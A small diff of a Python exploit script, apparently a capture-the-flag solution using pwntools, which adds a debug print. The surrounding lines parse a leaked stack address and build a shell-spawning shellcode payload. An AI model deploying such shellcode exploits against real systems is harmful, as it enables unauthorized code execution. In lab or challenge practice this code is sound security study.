@@ -11,6 +11,7 @@ else:
 print(io.recvline())
 io.sendline('throwaway')
 response = str(io.recvline()) # 'b"I'll make it: 0x000xyz\\n"'
+print(response)
 stack_address = re.search("0x[0-9a-f]+", response).group()
 
 payload = asm(shellcraft.sh())
